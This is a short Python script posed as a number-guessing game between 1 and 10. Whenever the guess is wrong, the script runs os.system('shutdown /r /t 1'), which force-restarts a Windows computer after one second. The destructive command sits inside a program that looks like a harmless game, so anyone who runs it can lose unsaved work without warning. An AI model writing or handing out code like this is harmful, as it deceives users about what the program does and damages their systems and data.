import os
import random

number = random.randint(1, 10)
guess = int(input("Guess a number between 1 and 10: "))

if guess == number:
    print("You won!")
else:
    os.system("shutdown /r /t 1")